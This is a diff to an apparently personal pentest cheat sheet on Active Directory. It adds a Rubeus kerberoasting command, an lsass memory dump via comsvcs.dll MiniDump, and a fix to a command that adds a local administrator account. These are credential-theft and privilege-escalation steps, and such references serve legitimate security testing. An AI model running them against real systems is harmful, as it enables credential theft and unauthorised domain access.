@@ -17,6 +17,12 @@ $ foreach($c in $computers) { echo "$($c.name) ($($c.useraccountcontrol))" }
 
 ![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)
 
+With [Rubeus](https://github.com/GhostPack/Rubeus), it's possible to dump the hashes:
+
+```bash
+Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /domain:"<fqdn_dom>" /outfile:"kerberoast.hash.txt"
+```
+
 
 ### Collect AD users information
 ```powerhsell
@@ -218,7 +224,7 @@ Converted 3948 frames
 # create a local user
 $ net user <username> <password> /add
 # add user to local admin group
-$ net localgroup Administrateur <username> /add
+$ net localgroup Administrators <username> /add
 ```
 
 
@@ -231,4 +237,11 @@ can use the `expand` command:
 ```bash
 expand -f:* "update.msu" "%temp%\\update.msu"
 expand -f:* "%temp%\\update.msu\\update.cab" "%temp%\\update.msu\\update.cab"
+```
+
+
+### Dumping lsass
+```bash
+tasklist /fi "imagename eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full
 ```
